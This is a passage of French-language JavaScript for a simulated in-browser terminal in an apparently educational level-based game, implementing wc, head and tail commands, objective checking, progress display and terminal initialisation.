            else if (a === '-c' || a === '-m') charsMode = true;
            else if (!a.startsWith('-')) files.push(a);
        }

        if (!linesMode && !wordsMode && !charsMode) {
            linesMode = wordsMode = charsMode = true;
        }

        let text;
        if (pipedInput) {
            text = pipedInput;
        } else if (files.length > 0) {
            text = this.getFileContent(files[0]);
        } else {
            throw new Error('wc: pas de données en entrée');
        }

        const parts = [];
        if (linesMode) parts.push(text.split('\n').length);
        if (wordsMode) parts.push(text.split(/\s+/).filter(Boolean).length);
        if (charsMode) parts.push(text.length);

        return parts.join(' ');
    }

    cmdHead(args, pipedInput) {
        let n = 10;
        let files = [];

        for (let i = 0; i < args.length; i++) {
            if (args[i] === '-n' && i + 1 < args.length) n = parseInt(args[++i]);
            else if (args[i].startsWith('-n')) n = parseInt(args[i].slice(2));
            else if (args[i].match(/^-\d+$/)) n = parseInt(args[i].slice(1));
            else if (!args[i].startsWith('-')) files.push(args[i]);
        }

        let lines;
        if (pipedInput) {
            lines = pipedInput.split('\n');
        } else if (files.length > 0) {
            lines = this.getFileContent(files[0]).split('\n');
        } else {
            throw new Error('head: pas de données en entrée');
        }

        return lines.slice(0, n).join('\n');
    }

    cmdTail(args, pipedInput) {
        let n = 10;
        let files = [];

        for (let i = 0; i < args.length; i++) {
            if (args[i] === '-n' && i + 1 < args.length) n = parseInt(args[++i]);
            else if (args[i].startsWith('-n')) n = parseInt(args[i].slice(2));
            else if (args[i].match(/^-\d+$/)) n = parseInt(args[i].slice(1));
            else if (args[i] === '-f') { /* skip, not supported in browser */ }
            else if (!args[i].startsWith('-')) files.push(args[i]);
        }

        let lines;
        if (pipedInput) {
            lines = pipedInput.split('\n');
        } else if (files.length > 0) {
            lines = this.getFileContent(files[0]).split('\n');
        } else {
            throw new Error('tail: pas de données en entrée');
        }

        return lines.slice(-n).join('\n');
    }

    // ============================================================
    // VALIDATION DES OBJECTIFS
    // ============================================================
    checkObjectives(cmd, output) {
        if (!this.levelId || !LEVEL_OBJECTIVES[this.levelId]) return;

        const objectives = LEVEL_OBJECTIVES[this.levelId];
        let newlyCompleted = false;

        objectives.forEach(obj => {
            if (this.completedObjectives.has(obj.id)) return;

            try {
                if (obj.check(cmd, output)) {
                    this.completedObjectives.add(obj.id);
                    newlyCompleted = true;

                    // Mise à jour visuelle du checkbox
                    const objEl = document.querySelector(`[data-obj="${obj.id}"]`);
                    if (objEl) {
                        objEl.classList.add('completed');
                        objEl.querySelector('.obj-check').textContent = '✓';
                    }

                    // Message dans le terminal
                    this.print('');
                    this.print(`✅ OBJECTIF VALIDÉ : ${obj.text}`, 'term-success');
                    this.print('');

                    // Mettre à jour la barre de progression
                    this.updateProgress();
                }
            } catch (e) { /* ignore validation errors */ }
        });

        if (newlyCompleted) {
            // Sauvegarder la progression
            if (typeof saveProgress === 'function') saveProgress();
            this.checkLevelComplete();
        }
    }

    updateProgress() {
        const objectives = LEVEL_OBJECTIVES[this.levelId];
        const total = objectives.length;
        const done = this.completedObjectives.size;
        const pct = Math.round((done / total) * 100);

        const progressFill = document.getElementById(`progress-${this.levelId}`);
        const progressText = document.getElementById(`progress-text-${this.levelId}`);

        if (progressFill) progressFill.style.width = pct + '%';
        if (progressText) progressText.textContent = `${done} / ${total}`;
    }

    checkLevelComplete() {
        const objectives = LEVEL_OBJECTIVES[this.levelId];
        if (this.completedObjectives.size < objectives.length) return;

        this.print('══════════════════════════════════════════════', 'term-success');
        this.print('  🎉 TOUS LES OBJECTIFS SONT COMPLÉTÉS !', 'term-success');
        this.print('  Accès au niveau suivant déverrouillé.', 'term-success');
        this.print('══════════════════════════════════════════════', 'term-success');

        // Afficher la bannière de succès
        const banner = document.getElementById(`banner-${this.levelId}`);
        if (banner) banner.classList.remove('hidden');

        // Événement pour app.js
        document.dispatchEvent(new CustomEvent('level-complete', {
            detail: { level: this.levelId }
        }));
    }

    // Restaurer les objectifs sauvegardés (pour localStorage)
    restoreObjectives(objectiveIds) {
        if (!this.levelId || !LEVEL_OBJECTIVES[this.levelId]) return;

        objectiveIds.forEach(id => {
            this.completedObjectives.add(id);

            // Mise à jour visuelle
            const objEl = document.querySelector(`[data-obj="${id}"]`);
            if (objEl) {
                objEl.classList.add('completed');
                objEl.querySelector('.obj-check').textContent = '✓';
            }
        });

        this.updateProgress();
    }
}

// ============================================================
// INIT TERMINALS
// ============================================================
function initTerminals() {
    window._terminals = new Map();
    document.querySelectorAll('.sim-terminal').forEach(container => {
        const output = container.querySelector('.sim-output');
        const input = container.querySelector('.sim-input');
        const levelId = container.dataset.level || null;
        if (output && input) {
            const term = new SimulatedTerminal(output, input, levelId);
            term.print('Terminal Gentilly-3 — Tapez "help" pour la liste des commandes.', 'term-info');
            term.print('Fichiers disponibles : ls logs_centrale/', 'term-info');
            term.print('', '');
            // Initialiser l\'affichage du progrès
            if (levelId) {
                term.updateProgress();
                window._terminals.set(levelId, term);
            }
        }
    });
}

window.SimulatedTerminal = SimulatedTerminal;
window.initTerminals = initTerminals;
